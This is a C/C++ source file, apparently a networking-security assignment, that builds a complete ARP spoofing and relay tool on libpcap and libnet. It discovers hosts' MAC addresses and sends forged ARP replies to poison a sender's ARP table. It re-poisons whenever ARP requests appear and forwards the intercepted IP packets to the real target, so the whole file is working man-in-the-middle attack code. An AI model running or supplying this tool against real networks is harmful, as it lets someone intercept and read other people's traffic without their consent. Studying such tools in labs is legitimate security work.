#include <libnet.h>
#include <pcap.h>
#include <stdint.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <stdio.h>

const int ETHERNET_HEADER_LEN = 14;
const int ARP_HEADER_LEN = 28;
const int IP_ADDRESS_LEN = 4;
const int MAC_ADDRESS_LEN = 6;
void print_mac(uint8_t *addr) {  // 0 : source, 1 : dest
  for (int i = 0; i < 6; i++) {
    printf("%02x", *(addr++));
    if (i != 5) printf(":");
  }
  printf("\n");
}
void print_ip(struct in_addr ip) {
  printf("%d.%d.%d.%d\n", ip.s_addr >> 24, ((ip.s_addr >> 16 & 0xff)), ((ip.s_addr >> 8) & 0xff), ip.s_addr & 0xff);
}
int is_all0_mac(uint8_t* mac){
  for(int i = 0; i < MAC_ADDRESS_LEN; i++){
    if(mac[i] != 0) return 0;
  }
  return 1;  
}
int is_broadcast_mac(uint8_t* mac) {
  for (int i = 0; i < MAC_ADDRESS_LEN; i++) {
    if (mac[i] != 0xff) return 0;
  }
  return 1;
}
int mac_cmp(uint8_t* m1, uint8_t* m2){
  for (int i = 0; i < MAC_ADDRESS_LEN; i++) {
    if(m1[i] != m2[i]) return (int)m1[i] - m2[i];
  }
  return 0;
}
void set_eth_hdr(struct libnet_ethernet_hdr* eth_hdr, uint8_t* ether_dhost, uint8_t* ether_shost, uint16_t ether_type){
  memcpy(eth_hdr->ether_dhost, ether_dhost, MAC_ADDRESS_LEN);
  memcpy(eth_hdr->ether_shost, ether_shost, MAC_ADDRESS_LEN);
  eth_hdr->ether_type = ether_type;
}
void eth_hdr_to_packet(uint8_t* packet, struct libnet_ethernet_hdr* eth_hdr){
  memcpy(packet, eth_hdr->ether_dhost, MAC_ADDRESS_LEN);
  memcpy(packet + MAC_ADDRESS_LEN, eth_hdr->ether_shost, MAC_ADDRESS_LEN);
  packet[2*MAC_ADDRESS_LEN] = eth_hdr->ether_type >> 8;
  packet[2*MAC_ADDRESS_LEN+1] = eth_hdr->ether_type & 0xff;
}
void arp_hdr_to_packet(uint8_t* packet, uint8_t opcode, uint8_t* s_mac, struct in_addr s_ip, uint8_t* t_mac, struct in_addr t_ip){
  uint8_t prefix[] = {0,1,8,0,6,4};
  int prefix_len = 6;
  for (int i = 0; i < prefix_len; i++) packet[i] = prefix[i];
  packet[prefix_len] = opcode >> 8;
  packet[prefix_len+1] = opcode & 0xff;
  memcpy(packet + prefix_len+2, s_mac, MAC_ADDRESS_LEN);
  int pos = prefix_len+MAC_ADDRESS_LEN+2;
  packet[pos++] = s_ip.s_addr >> 24;
  packet[pos++] = ((s_ip.s_addr >> 16 & 0xff));
  packet[pos++] = ((s_ip.s_addr >> 8) & 0xff);
  packet[pos] = s_ip.s_addr & 0xff;
  memcpy(packet + prefix_len + MAC_ADDRESS_LEN + 6, t_mac, MAC_ADDRESS_LEN);
  pos = prefix_len + 2 * MAC_ADDRESS_LEN + 6;
  packet[pos++] = t_ip.s_addr >> 24;
  packet[pos++] = ((t_ip.s_addr >> 16 & 0xff));
  packet[pos++] = ((t_ip.s_addr >> 8) & 0xff);
  packet[pos] = t_ip.s_addr & 0xff;
}
void packet_to_eth_hdr(const uint8_t* p, struct libnet_ethernet_hdr* eth_hdr){
  for (int i = 0; i < MAC_ADDRESS_LEN; i++) eth_hdr->ether_dhost[i] = (uint8_t) * (p++);
  for (int i = 0; i < MAC_ADDRESS_LEN; i++) eth_hdr->ether_shost[i] = (uint8_t) * (p++);
  eth_hdr->ether_type = ntohs(*static_cast<uint16_t*>(static_cast<void*>((const_cast<uint8_t*>(p)))));
}

int packet_to_arp_hdr(const uint8_t* p, struct libnet_arp_hdr* arp_hdr, uint8_t* s_mac, struct in_addr* s_ip, uint8_t* t_mac, struct in_addr* t_ip){
  arp_hdr->ar_hrd = ntohs(*static_cast<uint16_t*>(static_cast<void*>((const_cast<uint8_t*>(p)))));
  p += 2;
  if(arp_hdr->ar_hrd != ARPHRD_ETHER) return -1;
  arp_hdr->ar_pro = ntohs(*static_cast<uint16_t*>(static_cast<void*>((const_cast<uint8_t*>(p)))));
  p += 2;
  if (arp_hdr->ar_pro != ETHERTYPE_IP) return -1;
  arp_hdr->ar_hln = (uint8_t)*(p++);
  arp_hdr->ar_pln = (uint8_t) * (p++);
  if(arp_hdr->ar_hln != MAC_ADDRESS_LEN or arp_hdr->ar_pln != IP_ADDRESS_LEN) return -1;
  arp_hdr->ar_op = ntohs(*static_cast<uint16_t*>(static_cast<void*>((const_cast<uint8_t*>(p)))));
  p += 2;
  //if(arp_hdr->ar_op != ARPOP_REQUEST) return -1;
  for (int i = 0; i < MAC_ADDRESS_LEN; i++) s_mac[i] = (uint8_t) * (p++);
  s_ip->s_addr = ntohl(*static_cast<uint32_t*>(static_cast<void*>((const_cast<uint8_t*>(p)))));
  p += 4;
  for (int i = 0; i < MAC_ADDRESS_LEN; i++) t_mac[i] = (uint8_t) * (p++);
  t_ip->s_addr = ntohl(*static_cast<uint32_t*>(static_cast<void*>((const_cast<uint8_t*>(p)))));
  return 0;
}

int packet_to_ip_hdr(const uint8_t* p, struct libnet_ipv4_hdr* ip_hdr){
  ip_hdr->ip_v = (uint8_t)((*p) >> 4);
  ip_hdr->ip_hl = (uint8_t)((*(p++) & 0xf));
  ip_hdr->ip_tos = (uint8_t) * (p++);
  ip_hdr->ip_len = ntohs(*static_cast<uint16_t*>(static_cast<void*>((const_cast<uint8_t*>(p)))));
  p += 2;
  ip_hdr->ip_id = ntohs(*static_cast<uint16_t*>(static_cast<void*>((const_cast<uint8_t*>(p)))));
  p += 2;
  ip_hdr->ip_off = ntohs(*static_cast<uint16_t*>(static_cast<void*>((const_cast<uint8_t*>(p)))));
  p += 2;
  ip_hdr->ip_ttl = (uint8_t) * (p++);
  ip_hdr->ip_p = (uint8_t) * (p++);
  ip_hdr->ip_sum = ntohs(*static_cast<uint16_t*>(static_cast<void*>((const_cast<uint8_t*>(p)))));
  p += 2;
  ip_hdr->ip_src.s_addr = ntohl(*static_cast<uint32_t*>(static_cast<void*>((const_cast<uint8_t*>(p)))));
  p += 4;
  ip_hdr->ip_dst.s_addr = ntohl(*static_cast<uint32_t*>(static_cast<void*>((const_cast<uint8_t*>(p)))));
  p += 4;
  if (ip_hdr->ip_hl < 5) {
    printf("[!]wrong IHL value(%d) in IP header\n", ip_hdr->ip_hl);
    return -1;
  }
  if (ip_hdr->ip_hl > 5) {
    uint32_t option_len = (ip_hdr->ip_hl - 5) << 2;
    uint8_t ip_option[option_len]; // maybe it will use in someday..?
    for (int i = 0; i < option_len; i++) ip_option[i] = (uint8_t) * (p++);
  }
  return 0;
}
int discover_mac(pcap_t* handle, struct in_addr ip, struct in_addr my_ip, uint8_t* mac, uint8_t* my_mac){
  printf("[+] Broadcasting a request mac address of "); print_ip(ip);
  libnet_ethernet_hdr request_eth_hdr;
  uint8_t broadcast_mac[MAC_ADDRESS_LEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  set_eth_hdr(&request_eth_hdr, broadcast_mac, my_mac, ETHERTYPE_ARP);
  uint8_t request_sender_mac[MAC_ADDRESS_LEN], request_target_mac[MAC_ADDRESS_LEN];
  struct in_addr request_sender_ip, request_target_ip;
  memcpy(request_sender_mac, my_mac, MAC_ADDRESS_LEN);
  memset(request_target_mac, 0x00, MAC_ADDRESS_LEN);
  request_sender_ip.s_addr = my_ip.s_addr;
  request_target_ip.s_addr = ip.s_addr;
  uint8_t request_packet[ETHERNET_HEADER_LEN + ARP_HEADER_LEN];
  eth_hdr_to_packet(request_packet, &request_eth_hdr);
  arp_hdr_to_packet(request_packet+ETHERNET_HEADER_LEN, ARPOP_REQUEST, request_sender_mac, request_sender_ip, request_target_mac, request_target_ip);
  pcap_sendpacket(handle, request_packet, ETHERNET_HEADER_LEN + ARP_HEADER_LEN);
  printf("[+] Done\n\n");
  printf("[+] Waiting for reply..\n");
  libnet_ethernet_hdr eth_hdr;
  libnet_arp_hdr arp_hdr;
  struct in_addr sender_ip, target_ip;
  while(1){
    struct pcap_pkthdr *header;
    const uint8_t *packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2){
      printf("[!] An error has been occured. Terminated");
      return -1;
    }
    int len = header->caplen;
    if (len < ETHERNET_HEADER_LEN+ARP_HEADER_LEN) continue;
    packet_to_eth_hdr(packet, &eth_hdr);
    if(eth_hdr.ether_type != ETHERTYPE_ARP) continue;
    // parse ARP header
    uint8_t dummy_mac[MAC_ADDRESS_LEN];
    if(packet_to_arp_hdr(packet+ETHERNET_HEADER_LEN,&arp_hdr, mac, &sender_ip, dummy_mac, &target_ip) == -1) continue;
    if (arp_hdr.ar_op != ARPOP_REPLY) continue;
    if(sender_ip.s_addr == ip.s_addr) break;
  }
  printf("[+] Done. mac address : "); print_mac(mac); printf("\n");  
}
// discover victim's mac by request -> infecting!
int arp_infect(pcap_t* handle, struct in_addr sender_ip, struct in_addr target_ip, struct in_addr my_ip, uint8_t* sender_mac, uint8_t* target_mac, uint8_t* my_mac) {
  printf("[+] Infecting sender's arp table. **Sender : "); print_ip(sender_ip);
  libnet_ethernet_hdr forgy_eth_hdr;
  set_eth_hdr(&forgy_eth_hdr,sender_mac, my_mac, ETHERTYPE_ARP);
  libnet_arp_hdr forgy_arp_hdr;
  forgy_arp_hdr.ar_hrd = ARPHRD_ETHER;
  forgy_arp_hdr.ar_pro = ETHERTYPE_IP;
  forgy_arp_hdr.ar_hln = MAC_ADDRESS_LEN;
  forgy_arp_hdr.ar_pln = IP_ADDRESS_LEN;
  uint8_t forgy_sender_mac[MAC_ADDRESS_LEN], forgy_target_mac[MAC_ADDRESS_LEN];
  struct in_addr forgy_sender_ip, forgy_target_ip;
  memcpy(forgy_sender_mac, my_mac, MAC_ADDRESS_LEN); // forgy!!!!
  memcpy(forgy_target_mac, sender_mac, MAC_ADDRESS_LEN);
  forgy_sender_ip.s_addr = target_ip.s_addr;
  forgy_target_ip.s_addr = sender_ip.s_addr;
  uint8_t forgy_packet[ETHERNET_HEADER_LEN+ARP_HEADER_LEN];
  eth_hdr_to_packet(forgy_packet, &forgy_eth_hdr);
  arp_hdr_to_packet(forgy_packet+ETHERNET_HEADER_LEN, ARPOP_REPLY, forgy_sender_mac, forgy_sender_ip, forgy_target_mac, forgy_target_ip);

  for(int cnt = 0; cnt < 3; cnt++){
    pcap_sendpacket(handle, forgy_packet, ETHERNET_HEADER_LEN+ARP_HEADER_LEN);
    sleep(1);
  }
  printf("[+] Done\n");
  return 0;
}

void forgy_arp_response_feedback(pcap_t* handle, struct in_addr* sender_ip, struct in_addr* target_ip, int pair, struct in_addr my_ip, uint8_t* my_mac) {
  // infect & gathering sender/target's mac address
  uint8_t sender_mac[pair][MAC_ADDRESS_LEN] = {};
  uint8_t target_mac[pair][MAC_ADDRESS_LEN] = {};
  printf("[+] 1. ------------------- Discover mac ----------------------\n");
  for(int i = 0; i < pair; i++){
    discover_mac(handle, sender_ip[i], my_ip, sender_mac[i], my_mac);
    discover_mac(handle, target_ip[i], my_ip, target_mac[i], my_mac);
  }
  printf("---------------------------------------------------------------\n\n");
  printf("[+] 2. ------------------- Infect a sender --------------------\n");
  for(int i = 0; i < pair; i++){
    if (arp_infect(handle, sender_ip[i], target_ip[i], my_ip, sender_mac[i], target_mac[i], my_mac) == -1) return;
  }
  printf("---------------------------------------------------------------\n\n");

  printf("[+] 3. ----------------------- Spoof!!! --------------------\n");

  // parse Ethernet header
  while(1){
    struct pcap_pkthdr* header;
    const uint8_t* p;
    int res = pcap_next_ex(handle, &header, &p);
    if (res == 0) continue;
    if (res == -1 || res == -2) {
      printf("[!] An error has been occured. Terminated\n");
      return;
    }
    int len = header->caplen;
    libnet_ethernet_hdr eth_hdr;
    if (len < ETHERNET_HEADER_LEN) continue;
    packet_to_eth_hdr(p, &eth_hdr);
    if(eth_hdr.ether_type == ETHERTYPE_IP){
      for(int i = 0; i < pair; i++){
        if(mac_cmp(eth_hdr.ether_shost, sender_mac[i]) == 0 and mac_cmp(eth_hdr.ether_dhost, my_mac) == 0){
          libnet_ipv4_hdr ip_header;
          printf("[+] Analyze spoofed IP packet\n");
          if(packet_to_ip_hdr(p+ETHERNET_HEADER_LEN, &ip_header) == -1) continue;
          printf("[+] source IP  : "); print_ip(ip_header.ip_src);
          printf("[+] dest   IP  : "); print_ip(ip_header.ip_dst);
          printf("\n");
          uint8_t relay_packet[header->caplen];
          libnet_ethernet_hdr relay_eth_hdr;
          set_eth_hdr(&relay_eth_hdr, target_mac[i], my_mac, ETHERTYPE_IP);
          memcpy(relay_packet, p, header->caplen);
          eth_hdr_to_packet(relay_packet, &relay_eth_hdr);
          printf("[+] Sending replay packet\n");
          pcap_sendpacket(handle, relay_packet, header->caplen);
          printf("[+] done.\n\n");
        }
      }
    }
    else if(eth_hdr.ether_type == ETHERTYPE_ARP){
      // parse ARP header
      if (len < ETHERNET_HEADER_LEN + ARP_HEADER_LEN) continue;
      libnet_arp_hdr arp_hdr;
      uint8_t arp_sender_mac[MAC_ADDRESS_LEN], arp_target_mac[MAC_ADDRESS_LEN];
      struct in_addr arp_sender_ip, arp_target_ip;
      if(packet_to_arp_hdr(p+ETHERNET_HEADER_LEN,&arp_hdr, arp_sender_mac, &arp_sender_ip, arp_target_mac, &arp_target_ip) == -1) continue;
      for(int i = 0; i < pair; i++){
        if(arp_sender_ip.s_addr == sender_ip[i].s_addr and arp_target_ip.s_addr == target_ip[i].s_addr){
          printf("[+] sender requests target's address. **sender : "); print_ip(sender_ip[i]);
        }
        else if(arp_sender_ip.s_addr == target_ip[i].s_addr ){//and is_broadcast_mac(eth_hdr.ether_dhost))
          printf("[+] target requests someone's address. **target : "); print_ip(target_ip[i]);
        }
        else continue;
        arp_infect(handle, sender_ip[i], target_ip[i], my_ip, sender_mac[i], target_mac[i], my_mac);
      }
    }
  }
}

int get_my_addr(char* dev, struct in_addr* my_ip, uint8_t* my_mac){
  /// get interface addresses
  struct ifaddrs *interface_addrs = NULL;
  if (getifaddrs(&interface_addrs) == -1) return -1;
  if (!interface_addrs) return -1;
  int flag = 0;
  int32_t sd = socket(PF_INET, SOCK_DGRAM, 0);
  if (sd < 0) {
    freeifaddrs(interface_addrs);
    return -1;
  }
  for (struct ifaddrs *ifa = interface_addrs; ifa != NULL; ifa = ifa->ifa_next) {
    if (strcmp(ifa->ifa_name, dev) != 0) continue;
   
    // mac
    if (ifa->ifa_data != 0) {
      struct ifreq req;
      strcpy(req.ifr_name, ifa->ifa_name);
      if (ioctl(sd, SIOCGIFHWADDR, &req) != -1) {
        uint8_t *mac = (uint8_t *)req.ifr_ifru.ifru_hwaddr.sa_data;
        for (int i = 0; i < 6; i++) my_mac[i] = mac[i];
        flag |= 2;
      }
    }
    
    // ip
    if (ifa->ifa_addr != 0) {
      int family = ifa->ifa_addr->sa_family;
      if (family == AF_INET) {
        char host[NI_MAXHOST];
        if (getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in), host,
                        NI_MAXHOST, NULL, 0, NI_NUMERICHOST) == 0) {
          inet_aton(host, my_ip);
          my_ip->s_addr = htonl(my_ip->s_addr);
          flag |= 1;
        }
      }
    }
  }
  close(sd);
  freeifaddrs(interface_addrs);
  if(flag == 3) return 0;
  else return -1;
}
void usage() {
  printf("syntax: pcap_test <interface> <send ip 1> <target ip 1> <send ip 2> <target ip 2> <send ip 3> <target ip 3> ... \n");
  printf("sample: pcap_test wlan0 192.168.43.57 192.168.43.1 192.168.43.6 192.168.43.28\n");
}

int main(int argc, char *argv[]) {
  if (argc == 2 or argc % 2 == 1) {
    usage();
    return -1;
  }

  char *dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
  
  //pcap_t *handle = pcap_open_offline("20180927_arp.pcap", errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }
  int pair = (argc-2) / 2;
  struct in_addr my_ip;
  uint8_t my_mac[MAC_ADDRESS_LEN];
  for(int i = 0; i < pair; i++){}
  if(get_my_addr(dev, &my_ip, my_mac) == -1){
    fprintf(stderr, "couldn't find ip/mac address\n");
    return -1;
  }
  printf("my ip : "); print_ip(my_ip);
  printf("my mac : "); print_mac(my_mac);
  struct in_addr sender_ip[pair], target_ip[pair];
  for(int i = 0; i < pair; i++){
    if(!inet_aton(argv[2*i+2], &sender_ip[i]) or !inet_aton(argv[2*i+3], &target_ip[i])){
      fprintf(stderr, "wrong send ip or target ip\n");
      return -1;
    }
    sender_ip[i].s_addr = htonl(sender_ip[i].s_addr);
    target_ip[i].s_addr = htonl(target_ip[i].s_addr);
  }
  forgy_arp_response_feedback(handle, sender_ip, target_ip, pair, my_ip, my_mac);

  pcap_close(handle);
  return 0;
}
